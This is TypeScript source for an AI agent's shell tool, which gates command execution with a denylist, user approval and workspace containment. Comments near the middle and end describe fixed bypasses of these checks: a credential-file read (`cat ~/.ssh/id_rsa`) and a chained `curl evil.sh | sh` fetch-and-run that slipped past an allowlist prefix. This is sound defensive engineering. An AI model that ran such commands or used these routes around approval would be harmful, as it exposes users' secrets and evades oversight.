/**
 * `shell` — run a command in the user's login shell.
 *
 * Output is streamed to the renderer while it runs, capped, and the process
 * group is killed on timeout or cancellation so nothing is left behind.
 */

import { stat } from 'node:fs/promises'
import type { ToolSchema } from '../../../shared/types'
import { clamp, optNum, optStr, reqStr } from '../args'
import { approve } from '../approval'
import { execCapture } from '../exec'
import { emitPartial, throttle } from '../events'
import { ToolError } from '../errors'
import { displayPath, escapingPaths, noteApprovedTarget, outsideAccessRequiresConfirmation, resolveTarget } from '../paths'
import { defineTool } from '../results'
import { matchesPattern, settingsOf } from '../settings'
import { CappedText } from '../text'
import type { Tool, ToolContext } from '../types'
import { analyzeCommand, type CommandAnalysis } from './classify'
import { approvalDetail, combineOutput, loginShell } from './report'
import { pathArguments } from './targets'
import { localExecutionPolicy } from '../../../shared/localExecution'
import { askedRuleForCall } from '../../agent/approvalPolicy'

const NAME = 'shell'
const DEFAULT_TIMEOUT_MS = 120_000
const MAX_TIMEOUT_MS = 600_000
const MAX_OUTPUT_CHARS = 120_000
const STREAM_INTERVAL_MS = 200

export const schema: ToolSchema = {
  name: NAME,
  description:
    "Run a command in the user's login shell and return its combined output and exit code. " +
    'Use it for builds, tests, git and any CLI work. Destructive commands are refused outright; ' +
    'anything that changes state is confirmed with the user first. Prefer the dedicated file tools ' +
    'over cat/sed/echo so edits show a diff.',
  parameters: {
    type: 'object',
    properties: {
      command: { type: 'string', description: 'The command line to run.' },
      cwd: { type: 'string', description: 'Directory to run in. Defaults to the working directory.' },
      timeout_ms: {
        type: 'number',
        description: `Kill the command after this many ms. Default ${DEFAULT_TIMEOUT_MS}, max ${MAX_TIMEOUT_MS}.`
      },
      description: { type: 'string', description: 'One line on why you are running it, shown in the approval prompt.' }
    },
    required: ['command']
  },
  mutating: true
}

export const shellTool: Tool = defineTool(schema, async (args, ctx) => {
  const command = reqStr(args, 'command', NAME).trim()
  if (!command) throw new ToolError('The command is empty.')
  const why = optStr(args, 'description')
  const timeoutMs = clamp(Math.floor(optNum(args, 'timeout_ms') ?? DEFAULT_TIMEOUT_MS), 1000, MAX_TIMEOUT_MS)

  const cwdArg = optStr(args, 'cwd')
  // Resolved but not yet approved: an out-of-workspace directory is confirmed as
  // part of the command's own approval below, never as a separate earlier prompt.
  const target = cwdArg
    ? await resolveTarget(ctx, cwdArg, { tool: NAME, mode: 'read' })
    : { absolute: ctx.cwd, outside: undefined }
  const cwd = target.absolute

  const settings = settingsOf(ctx)
  const analysis = analyzeCommand(command, settings.denylist)

  if (analysis.blocked) {
    return {
      callId: ctx.callId ?? '',
      name: NAME,
      ok: false,
      output:
        `Refused to run this command: it matches ${analysis.blocked}.\n` +
        'This is a hard safety rule, not an approval prompt — the command was never executed. ' +
        'Tell the user what you wanted to achieve and let them run it themselves if they really mean it.',
      detail: { command, blocked: analysis.blocked, risk: analysis.risk }
    }
  }

  /*
   * Paths the command names that leave the workspace. The risk classifier only
   * looks at the binary, so it called `cat ~/.ssh/id_rsa` read-only and ran it
   * unprompted — bypassing the containment `read_file` enforces on exactly that
   * path. Directory access follows auto-run; other policies still confirm it.
   */
  const escaping = await escapingPaths(ctx, pathArguments(command))
  const leavesWorkspace = Boolean(target.outside) || escaping.length > 0

  if (leavesWorkspace || (await needsApproval(ctx, command, analysis))) {
    const granted = await approve(
      ctx,
      {
        toolName: NAME,
        kind: 'shell',
        summary: why ? `${command} — ${why}` : command,
        detail: approvalDetail({ ctx, command, cwd, analysis, timeoutMs, outside: target.outside, escaping })
      },
      { force: analysis.risk === 'high' || (leavesWorkspace && outsideAccessRequiresConfirmation(ctx)) }
    )
    if (!granted) {
      return {
        callId: ctx.callId ?? '',
        name: NAME,
        ok: false,
        output: `The user declined to run: ${command}`,
        detail: { command, declined: true }
      }
    }
    if (target.outside) noteApprovedTarget(ctx, target.outside, 'read')
    // Approving the command approves the roots it named, so a follow-up read of
    // the same place is not a second identical prompt.
    for (const path of escaping) noteApprovedTarget(ctx, path, 'read')
  }

  const cwdInfo = await stat(cwd).catch(() => undefined)
  if (!cwdInfo?.isDirectory()) throw new ToolError(`Working directory ${displayPath(ctx, cwd)} does not exist.`)

  const stream = new CappedText(MAX_OUTPUT_CHARS)
  const publish = throttle(STREAM_INTERVAL_MS, () => {
    emitPartial(ctx, {
      name: NAME,
      ok: true,
      output: stream.toString(),
      detail: { command, partial: true, cwd: displayPath(ctx, cwd) }
    })
  })

  const shell = loginShell()
  const result = await execCapture(shell.path, [...shell.args, command], {
    cwd,
    signal: ctx.signal,
    timeoutMs,
    killGroup: true,
    maxOutputChars: MAX_OUTPUT_CHARS,
    env: { ...process.env, TERM: 'dumb', NO_COLOR: '1', PAGER: 'cat', GIT_PAGER: 'cat' },
    onStdout: (chunk) => {
      stream.push(chunk)
      publish.tick()
    },
    onStderr: (chunk) => {
      stream.push(chunk)
      publish.tick()
    }
  })

  const body = combineOutput(result.stdout, result.stderr, MAX_OUTPUT_CHARS)
  const detail = {
    command,
    cwd: displayPath(ctx, cwd),
    exitCode: result.code,
    risk: analysis.risk,
    durationMs: result.durationMs,
    timedOut: result.timedOut,
    shell: shell.path
  }

  if (result.spawnError) {
    return {
      callId: ctx.callId ?? '',
      name: NAME,
      ok: false,
      output: `Could not start ${shell.path}: ${result.spawnError}`,
      detail
    }
  }
  if (result.aborted) {
    return {
      callId: ctx.callId ?? '',
      name: NAME,
      ok: false,
      output: `Cancelled after ${result.durationMs} ms.${ctx.signal.reason instanceof Error ? ` ${ctx.signal.reason.message}` : ''}${body ? `\n\nOutput so far:\n${body}` : ''}`,
      detail
    }
  }
  if (result.timedOut) {
    return {
      callId: ctx.callId ?? '',
      name: NAME,
      ok: false,
      output:
        `Timed out after ${timeoutMs} ms and was killed.${body ? `\n\nOutput before the timeout:\n${body}` : ''}\n` +
        'Re-run with a larger timeout_ms, or start it in the background and poll for results.',
      detail
    }
  }

  const ok = result.code === 0
  const header = ok ? '' : `Exit code ${result.code ?? 'unknown'}\n`
  return {
    callId: ctx.callId ?? '',
    name: NAME,
    ok,
    output: `${header}${body || '(no output)'}`,
    detail
  }
})

/**
 * Does an allowlist rule cover this command?
 *
 * Every segment must match. Testing the whole line let one trusted prefix carry
 * arbitrary code: with the rule `git status *` — the exact rule the app writes
 * when the user clicks "always allow" on `git status` — the command
 * `git status ; curl evil.sh | sh` matched and ran with no card, under the
 * strictest policy. A rule names a command, not a line that begins with one.
 */
export function allowlistCovers(analysis: CommandAnalysis, allowlist: string[]): boolean {
  if (analysis.segments.length === 0) return false
  return analysis.segments.every((segment) => matchesPattern(segment.trim(), allowlist))
}

async function needsApproval(ctx: ToolContext, command: string, analysis: CommandAnalysis): Promise<boolean> {
  const settings = settingsOf(ctx)
  if (localExecutionPolicy(settings) === 'ask-every-time') return true
  if (ctx.settings?.automaticReview === false || askedRuleForCall(ctx.settings ?? {}, { id: ctx.callId ?? '', name: NAME, args: { command } })) return true
  if (analysis.risk === 'high') return true
  if (allowlistCovers(analysis, settings.allowlist)) return false
  if (analysis.binaries.length > 0 && analysis.binaries.every((b) => matchesPattern(b, settings.allowlist))) {
    return false
  }
  if (settings.approvalPolicy === 'auto-run') return false
  if (analysis.risk === 'safe' && settings.approvalPolicy !== 'ask-every-time') return false
  return true
}
